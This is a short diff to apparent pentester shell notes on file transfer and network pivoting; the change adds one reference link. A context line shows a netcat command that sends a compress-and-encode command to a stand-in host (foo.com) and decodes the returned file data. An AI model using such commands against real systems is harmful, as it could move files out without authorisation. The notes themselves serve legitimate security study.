@@ -29,6 +29,7 @@ echo 'gzip -ck9 ./foo | base64 -w0' | nc foo.com 5000 | base64 -d | gzip -d
 # ||
 # https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
 # https://nullsweep.com/pivot-cheatsheet-for-pentesters/
+# https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/
 
 # Workaround remote commands without a login shell
 # Reference: https://susam.in/blog/file-transfer-with-ssh-tee-and-base64/
